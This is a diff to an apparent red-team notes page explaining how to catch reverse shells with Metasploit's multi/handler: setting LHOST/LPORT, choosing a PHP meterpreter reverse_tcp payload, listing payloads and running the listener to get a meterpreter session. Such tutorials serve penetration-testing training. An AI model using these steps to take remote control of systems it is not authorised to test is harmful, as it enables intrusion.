@@ -8,29 +8,31 @@ The msfconsole can be used to catch reverse shells. Some reverse shell may be up
 
 * First, load the exploit, and define LHOST/LPORT 
 
-```ps
+```shell!
 $ msfconsole -q
 msf6> use multi/handler
-msf6 exploit('multi/handler')> setg LHOST tun0
-msf6 exploit('multi/handler')> setg LPORT 4444
+msf6> setg LHOST tun0
+msf6> setg LPORT 4444
 ```
 
 * Select the payload that would be appropriate
 
-```ps
-# example
-msf6 exploit('multi/handler')> set PAYLOAD php/meterpreter/reverse_tcp
+```shell!
+msf6> # warning, payload must match your client
+msf6> set PAYLOAD php/meterpreter/reverse_tcp
+msf6> grep meterpreter show payloads
+msf6> grep reverse_tcp grep Linux show payloads
 ```
 </div><div>
 
 * Run the catcher, and wait for incoming connections.
 
-```ps
-msf6 exploit('multi/handler') > run
-# WAIT
-# OK session created
-meterpreter> help # see what you can do
+```shell!
+msf6> run         # Wait for clients
+meterpreter> help # See what you can do
 ```
 
 ➡️ Your shell may not be a meterpreter, so you may try to [upgrade it](../index.md#meterpreter).
+
+📚 Refer to [msfvenom](/cybersecurity/red-team/s3.exploitation/shell/tools/msfvenom.md) to find payloads.
 </div></div>
